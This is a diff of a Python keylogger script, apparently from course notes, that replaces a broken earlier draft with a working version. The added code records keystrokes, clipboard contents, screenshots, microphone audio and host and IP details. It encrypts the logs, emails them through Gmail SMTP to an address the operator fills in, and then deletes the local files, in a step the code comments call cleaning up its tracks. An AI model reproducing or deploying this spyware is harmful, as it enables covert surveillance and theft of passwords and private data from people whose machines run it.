@@ -1,188 +1,242 @@
-#libraries
+# keylogger.py
+# Create an Advanced Keylogger in Python - Crash Course notes
+# Author: Grant Collins
+
+# Libraries
+
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
-import keyword
 import smtplib
+
 import socket
 import platform
-from threading import current_thread
+
 import win32clipboard
-from pynput.keyboard import key, Listener
+
+from pynput.keyboard import Key, Listener
+
 import time
 import os
+
 from scipy.io.wavfile import write
 import sounddevice as sd
+
 from cryptography.fernet import Fernet
+
 import getpass
-from requests import get 
+from requests import get
+
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
-#variables
+
 keys_information = "key_log.txt"
-file_path = "C:\\Users\\glory\OneDrive\\Desktop\\adv_keylogging_proj_py\\Project"
+system_information = "syseminfo.txt"
+clipboard_information = "clipboard.txt"
+audio_information = "audio.wav"
+screenshot_information = "screenshot.png"
+
+keys_information_e = "e_key_log.txt"
+system_information_e = "e_systeminfo.txt"
+clipboard_information_e = "e_clipboard.txt"
+
+microphone_time = 10
+time_iteration = 15
+number_of_iterations_end = 3
+
+email_address = " " # Enter disposable email here
+password = " " # Enter email password here
+
+username = getpass.getuser()
+
+toaddr = " " # Enter the email address you want to send your information to
+
+key = "BeaODkSUzxAscMjAvU2yQyuCuccJL2lrBMShRzkn8XU=" # Generate an encryption key from the Cryptography folder
+
+file_path = " " # Enter the file path you want your files to be saved to
 extend = "\\"
 file_merge = file_path + extend
 
-count = 0
-keys = []
-key_information = "key_log.txt"
-system_information = "system_info.txt"
-email_address = ""
-password = ""
-clipboard_information = "clipboard.txt"
-audio_information = "audio.wav"
-screenshot_information = "ss.png"
-time_iteration = 15
-microphone_time = 10;
-number_of_iteration_end = 3
+# email controls
+def send_email(filename, attachment, toaddr):
 
-key_information_e = "e_key_log.txt"
-system_information_e = "e_system_info.txt"
-clipboard_information_e = "e_clipboard.txt"
-#class
-class Keylogger:
-    def __init__(self, time_interval, email, password):
-        self.interval = time_interval
-        self.email = email
-        self.password = password
+    fromaddr = email_address
 
-    def append_to_file(self, string):
-        with open(file_path + extend + keys_information, "a") as f:
-            f.write(string)
+    msg = MIMEMultipart()
 
-    def computer_information():
-        with open(file_path + extend + system_information, "a") as f:
-            hostname = socket.gethostname()
-            IPAddr = socket.gethostbyname(hostname)
-            try:
-                public_ip = get("https://api.ipify.org").text
-                f.write("Public IP Address: " + public_ip)
-            except Exception:
-                f.write("Couldn't get Public IP Address (most likely max query")
-            f.write("Processor: " + (platform.processor()) + "")
-            f.write("System: " + platform.system() + " " + platform.version() + "")
-            f.write("Machine: " + platform.machine() + "")
-            f.write("Hostname: " + hostname + "")
-            f.write("Private IP Address: " + IPAddr + "")
+    msg['From'] = fromaddr
 
-    computer_information()
+    msg['To'] = toaddr
 
-    def process_key_press(self, key):
-        global keys, count
+    msg['Subject'] = "Log File"
 
+    body = "Body_of_the_mail"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet-stream')
+
+    p.set_payload((attachment).read())
+
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, password)
+
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+# get the computer information
+def computer_information():
+    with open(file_path + extend + system_information, "a") as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
         try:
-            current_key = str(key.char)
-        except AttributeError:
-            if key == key.space:
-                current_key = " "
-            else:
-                current_key = " " + str(key) + " "
+            public_ip = get("https://api.ipify.org").text
+            f.write("Public IP Address: " + public_ip)
 
-        keys.append(current_key)
+        except Exception:
+            f.write("Couldn't get Public IP Address (most likely max query")
+
+        f.write("Processor: " + (platform.processor()) + '\n')
+        f.write("System: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + "\n")
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + IPAddr + "\n")
+
+computer_information()
+
+# get the clipboard contents
+def copy_clipboard():
+    with open(file_path + extend + clipboard_information, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            f.write("Clipboard Data: \n" + pasted_data)
+
+        except:
+            f.write("Clipboard could be not be copied")
+
+copy_clipboard()
+
+# get the microphone
+def microphone():
+    fs = 44100
+    seconds = microphone_time
+
+    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+    sd.wait()
+
+    write(file_path + extend + audio_information, fs, myrecording)
+
+# get screenshots
+def screenshot():
+    im = ImageGrab.grab()
+    im.save(file_path + extend + screenshot_information)
+
+screenshot()
+
+
+number_of_iterations = 0
+currentTime = time.time()
+stoppingTime = time.time() + time_iteration
+
+# Timer for keylogger
+while number_of_iterations < number_of_iterations_end:
+
+    count = 0
+    keys =[]
+
+    def on_press(key):
+        global keys, count, currentTime
+
+        print(key)
+        keys.append(key)
         count += 1
+        currentTime = time.time()
 
         if count >= 1:
             count = 0
-            self.write_file(keys)
-            keys = []
+            write_file(keys)
+            keys =[]
 
-    def write_file(self, keys):
+    def write_file(keys):
         with open(file_path + extend + keys_information, "a") as f:
             for key in keys:
-                k = key.replace("'", "")
+                k = str(key).replace("'", "")
                 if k.find("space") > 0:
-                    f.write(' ')
+                    f.write('\n')
+                    f.close()
                 elif k.find("Key") == -1:
                     f.write(k)
+                    f.close()
 
     def on_release(key):
-        if key == keyword.esc:
+        if key == Key.esc:
             return False
-    with Listener(on_press=process_key_press, on_release=on_release) as listener:
+        if currentTime > stoppingTime:
+            return False
+
+    with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
-        
 
-    def send_mail(self, email, password, message):
-        server = smtplib.SMTP("smtp.gmail.com", 587)
-        server.starttls()
-        server.login(email, password)
-        server.sendmail(email, email, message)
-        server.quit()
+    if currentTime > stoppingTime:
 
-    def report(self):
-        self.send_mail(self.email, self.password, "\n")
-        self.send_mail(self.email, self.password, file_path + extend + keys_information)
-        self.send_mail(self.email, self.password, "\n")
-        os.remove(file_path + extend + keys_information)
+        with open(file_path + extend + keys_information, "w") as f:
+            f.write(" ")
 
-    def screenshot(self):
-        im = ImageGrab.grab()
-        im.save(file_path + extend + "ss.png")
-    
-    screenshot()
-
-    number_of_iteration = 0
-    current_time = time.time()
-    stopping_time = time.time() + time_iteration
-
-    if current_time > stopping_time:
         screenshot()
-        number_of_iteration += 1
-        current_time = time.time()
-        stopping_time = time.time() + time_iteration
+        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
 
-    def system_info(self):
-        with open(file_path + extend + "system_info.txt", "a") as f:
-            hostname = socket.gethostname()
-            IPAddr = socket.gethostbyname(hostname)
-            try:
-                public_ip = get("https://api.ipify.org").text
-                f.write("Public IP Address: " + public_ip)
-            except Exception:
-                f.write("Couldn't get Public IP Address (most likely max query")
-            f.write("Processor: " + (platform.processor()) + "")
-            f.write("System: " + platform.system() + " " + platform.version() + "")
-            f.write("Machine: " + platform.machine() + "")
-            f.write("Hostname: " + hostname + "")
-            f.write("Private IP Address: " + IPAddr + "")
+        copy_clipboard()
 
-    def microphone(self):
-        fs = 44100
-        seconds = 10
+        number_of_iterations += 1
 
-        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
-        sd.wait()
+        currentTime = time.time()
+        stoppingTime = time.time() + time_iteration
 
-        write(file_path + extend + "audio.wav", fs, myrecording)
+# Encrypt files
+files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
+encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]
 
-    def clipboard(self):
-        with open(file_path + extend + "clipboard.txt", "a") as f:
-            try:
-                win32clipboard.OpenClipboard()
-                pasted_data = win32clipboard.GetClipboardData()
-                win32clipboard.CloseClipboard()
+count = 0
 
-                f.write("Clipboard Data: \n" + pasted_data)
-            except:
-                f.write("Clipboard could not be copied")
+for encrypting_file in files_to_encrypt:
 
-    def run(self):
-        keyboard_listener = Listener(on_press=self.process_key_press)
-        with keyboard_listener:
-            self.report()
-            self.screenshot()
-            self.system_info()
-            self.microphone()
-            self.clipboard()
-            keyboard_listener.join()
+    with open(files_to_encrypt[count], 'rb') as f:
+        data = f.read()
 
-#main
-if __name__ == "__main__":
-    keylogger = Keylogger(120, "")
-    keylogger.run()
+    fernet = Fernet(key)
+    encrypted = fernet.encrypt(data)
 
-file_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
+    with open(encrypted_file_names[count], 'wb') as f:
+        f.write(encrypted)
 
+    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
+    count += 1
+
+time.sleep(120)
+
+# Clean up our tracks and delete files
+delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
+for file in delete_files:
+    os.remove(file_merge + file)
 
